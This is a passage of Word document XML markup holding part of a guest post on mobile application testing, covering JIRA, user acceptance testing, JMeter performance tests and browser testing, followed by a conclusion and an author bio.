          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="473" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/atlassian-jira-tutorial-1/" \o "JIRA test management tool Tutorials" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>JIRA</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> is used for writing of acceptance criteria; maintaining of test cases and logging /re-verification of defects. Once the iteration gets over, </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>iteration</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>planning</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> meeting held where dev. The team, product owner, business analyst, and QA team discuss </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>what went well</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> and </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>what needs to improve</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>.</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74" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="475" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step #3. </w:t>
        </w:r>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"http://www.softwaretestinghelp.com/what-is-alpha-testing-beta-testing/" \o "Beta testing"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Beta Testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> Once the regression testing is completed by the QA team, the build moves into UAT. User Acceptance Testing is done by the client. They re-verify all the bugs to make sure every bug was fixed and the application is working as expected on every approved browser.</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76" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="477" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step #4. Performance test:</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> Performance testing team tests the performance of the web app using </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>JMeter</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> scripts and with different the loads on the application.</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78" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="479" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step #5. </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/best-cross-browser-testing-tools-to-ease-your-browser-compatibility-testing-efforts/" \o "Cross browser testing" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Browser testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> The web app gets tested across multiple browsers- both using different simulation tools as well as physically using real mobile devices.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="480" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="481" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Step #6. Launch plan:</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> After every 4th week, the testing moves into staging, where a final round of end to end testing on these devices is performed to make sure the product is ready for production. And then, it goes Live!</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="482" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="483" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Conclusion</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="484" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="485" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Designing the right test strategy, choosing the right mobile simulators, devices and mobile testing tools can make sure that we have 100% test coverage and help us include security, usability, performance, functionality and compatibility based tests into our test suites.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="486" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="487" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Well, this has been our effort to </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>fulfil</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> multiple requests from our readers on a mobile application testing guide.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="488" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="489" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>About Author</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>: </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">This is a guest post by Nancy </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Ratnakar</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>. She is a Senior QA Engineer, in an MNC with more than 5 years of experience in QA and mobile testing. With extensive experience in STLC, she is an expert handling projects from initial requirement stage to the final release.</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="490" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="491" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Please let us know how we did in the comments.  Also, share your experiences if you are working or have worked on this kind of mobile testing. Your questions and suggestions are most welcome!</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cstheme="minorHAnsi"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cstheme="minorHAnsi"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRDefault="00B03134" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRDefault="00B03134" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRDefault="00B03134" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRDefault="00B03134" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B03134">
        <w:rPr>
